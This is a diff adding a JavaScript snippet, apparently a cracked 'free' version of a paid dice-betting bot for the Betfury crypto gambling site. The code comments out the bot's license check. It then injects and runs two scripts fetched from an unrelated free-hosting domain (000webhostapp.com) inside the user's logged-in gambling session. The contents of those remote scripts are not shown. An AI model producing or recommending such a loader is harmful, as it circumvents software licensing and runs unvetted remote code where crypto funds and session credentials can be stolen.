@@ -1,1 +1,46 @@
-479a0f0dccf3fac00aeeac527c2a0454436cdb5f8afa3f61b10beaecea3ce96c
+// Webdicebot-betfury-dice-free
+
+const BOT_URL = 'https://installer.webdicebot.xyz';
+const BOT_API = 'https://installer.webdicebot.xyz';
+
+
+function addJs(url, callback) {
+  let script = document.createElement("script");
+  script.type = "text/javascript";
+  script.src = url;
+  script.onload = callback;
+  document.head.appendChild(script);
+}
+
+addJs("https://code.jquery.com/jquery-3.6.0.min.js", async () => {
+/*
+  try {
+    await $.getScript(
+      BOT_URL + "/bot/setup?license=" + localStorage.getItem("license")
+    );
+    await $.getScript(
+      BOT_URL +
+        "/bot/src/betfury-dice?license=" +
+        localStorage.getItem("license")
+    );
+	*/
+	addJs("https://evnauthreferrals.000webhostapp.com/WebDiceBot/wintomato-dice-setup.js", async () => {
+		addJs("https://evnauthreferrals.000webhostapp.com/WebDiceBot/wintomato-dice.js", async () => {
+			botInstaller();
+		})
+	})
+/*
+  } catch (error) {
+    enterLicense();
+  }
+*/
+});
+
+/*
+function enterLicense() {
+  let license = prompt("your license wrong or expired, enter your new license");
+  if (!license) return enterLicense();
+  localStorage.setItem("license", license);
+  alert("refresh page then install bot again");
+}
+*/
